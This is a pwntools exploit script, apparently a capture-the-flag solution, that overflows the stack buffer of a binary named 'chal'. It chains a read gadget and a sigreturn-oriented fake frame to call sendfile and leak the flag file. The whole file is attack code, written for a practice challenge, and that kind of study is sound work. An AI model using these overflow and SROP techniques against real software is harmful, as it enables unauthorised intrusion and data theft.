from pwn import *

exe = ELF('./chal')
context.clear(arch='amd64')
context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']
def conn():
    if args.LOCAL:
        r = remote("localhost",1337)
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote()

    return r

def main():
    r = conn()
    
    syscall_ret = 0x0040119a
    ret = p64(0x000000000040119c)  
     
    s = SigreturnFrame(kernel='amd64') # preparing a fake sigframe which gets referred to after the sigreturncall, hence these values get onto the stack, this frame stores arguments to call sendfile() as we have flag fd open
    s.rax = 40
    s.rdi = 1
    s.rsi = 3 # fd is 5 on remote due to socat 
    s.rdx = 0
    s.r10 = 50
    s.rip = syscall_ret
    #gdb.attach(r,'''b *vuln+25''')
    pl =b'a'*16 +ret+ p64(exe.plt['read'])+ p64(syscall_ret)+ bytes(s) # 16 bytes offset + read gadget to read 15 bytes (rax stores 15 now) and after the syscall we call sigreturn with the sigframe on stack
    print(len(pl))
    r.recvline()
    r.sendline(pl)
    sleep(0.1)
    r.sendline(b'a'*14)
    r.interactive()

if __name__ == "__main__":
    main()
